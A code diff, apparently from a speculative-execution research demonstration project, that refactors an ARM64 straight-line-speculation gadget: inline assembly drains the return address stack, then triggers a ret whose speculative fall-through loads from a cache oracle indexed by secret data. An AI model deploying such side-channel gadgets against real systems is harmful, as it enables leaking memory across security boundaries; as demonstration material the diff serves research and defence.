@@ -21,12 +21,14 @@
 #include "compiler_specifics.h"
 #include "local_content.h"
 
-// Naked gadget: RAS drain + SLS trigger + dead code.
-//
-// x0 = data, x1 = offset, x2 = oracle, x6 = return address
+// x0 = data, x1 = offset, x2 = oracle
 SAFESIDE_NEVER_INLINE
-__attribute__((naked))
-static void SlsGadget() {
+static void TriggerSls(const char *data, size_t offset,
+                       const void *oracle) {
+  register const char *r0 asm("x0") = data;
+  register size_t r1 asm("x1") = offset;
+  register const void *r2 asm("x2") = oracle;
+
   asm volatile(
       // Phase 1: drain RAS (32 iterations)
       "mov x4, #32\n"
@@ -39,7 +41,7 @@ static void SlsGadget() {
       "  b.ne 0b\n"
 
       // Phase 2: SLS trigger (RAS empty -> BTB fallback)
-      "mov x30, x6\n"
+      "adr x30, 2f\n"
       "ret\n"
 
       // Dead code (speculative only)
@@ -48,29 +50,11 @@ static void SlsGadget() {
       "add x3, x3, x2\n"
       "ldrb w3, [x3]\n"
       "ret\n"
-  );
-}
 
-// Enter gadget via ADR+BR (no RAS push).
-SAFESIDE_NEVER_INLINE
-static void TriggerSls(const char *data, size_t offset,
-                       const void *oracle) {
-  register const char *r0 asm("x0") = data;
-  register size_t r1 asm("x1") = offset;
-  register const void *r2 asm("x2") = oracle;
-  register const void *gadget asm("x3") =
-      reinterpret_cast<const void *>(SlsGadget);
-
-  asm volatile(
-      "mov x7, x30\n"
-      "adr x30, 1f\n"
-      "mov x6, x30\n"
-      "br x3\n"
-      "1:\n"
-      "mov x30, x7\n"
+      "2:\n"
       :
-      : "r"(gadget), "r"(r0), "r"(r1), "r"(r2)
-      : "x4", "x5", "x6", "x7", "memory", "cc"
+      : "r"(r0), "r"(r1), "r"(r2)
+      : "x3", "x4", "x5", "x30", "memory", "cc"
   );
 }
 
